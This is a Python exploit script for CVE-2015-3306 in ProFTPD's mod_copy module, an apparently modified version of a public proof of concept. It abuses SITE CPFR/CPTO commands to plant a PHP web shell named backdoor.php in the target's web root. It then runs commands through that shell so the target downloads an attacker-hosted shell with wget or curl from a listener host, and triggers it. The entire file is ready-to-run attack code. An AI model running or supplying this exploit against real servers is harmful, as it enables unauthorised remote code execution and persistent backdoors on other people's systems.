#!/usr/bin/env python3
# CVE-2015-3306 exploit by t0kx
# https://github.com/t0kx/exploit-CVE-2015-3306

import re
import socket
import requests
import argparse
import sys

class Exploit:
    def __init__(self, host, port, path, shell, lhost, server_port):
        self.__sock = None
        self.__host = host
        self.__port = port
        self.__path = path
        self.__shell = shell  # New
        self.__lhost = lhost  # New
        self.__server_port = server_port  # New

    def __connect(self):
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.connect((self.__host, self.__port))
        self.__sock.recv(1024)

    def __exploit(self):
        payload = "<?php echo passthru($_GET['cmd']); ?>"
        self.__sock.send(b"site cpfr /proc/self/cmdline\n")
        self.__sock.recv(1024)
        self.__sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpto " + self.__path + "/backdoor.php\n").encode("utf-8"))

        if "Copy successful" in str(self.__sock.recv(1024)):
            print("[+] Target exploited, acessing shell at http://" + self.__host + "/backdoor.php")
            self.__trigger()  # Modified
            requests.get("http://" + self.__host + f"/{self.__shell}")  # New
        else:
            print("[!] Failed")

    def __trigger(self):
        ############### New ###############
        tools = ["wget", "curl"]
        count = 0
        while (True):
            if count == 2:
                sys.exit("wget and curl are not in path")
            data = requests.get("http://" + self.__host + f"/backdoor.php?cmd=which {tools[count]}")
            match = re.search('cpto /tmp/.([^"]+)', data.text)
            tool = str(match.group(0)[11::].replace("\n", ""))
            if "wget" in tool:
                requests.get(
                    "http://" + self.__host + f"/backdoor.php?cmd=wget http://{self.__lhost}:{self.__server_port}/{self.__shell} | mv {self.__shell} {self.__path}/")
                break
            if "curl" in tool:
                requests.get(
                    "http://" + self.__host + f"/backdoor.php?cmd=curl -o {self.__shell} http://{self.__lhost}:{self.__server_port}/{self.__shell} | mv {self.__shell} {self.__path}/")
                break
            count = count + 1
        ############### New ###############

    def run(self):
        self.__connect()
        self.__exploit()


def main(args):
    print("[+] CVE-2015-3306 exploit by t0kx")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Exploit(args.host, int(args.port), args.path, args.shell, args.lhost, int(args.server_port))  # Modified
    exploit.run()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', required=True)
    parser.add_argument('--path', required=True)
    parser.add_argument('--shell', required=True)  # New
    parser.add_argument('--lhost', required=True)  # New
    parser.add_argument('--server_port', required=True)  # New
    args = parser.parse_args()

    main(args)
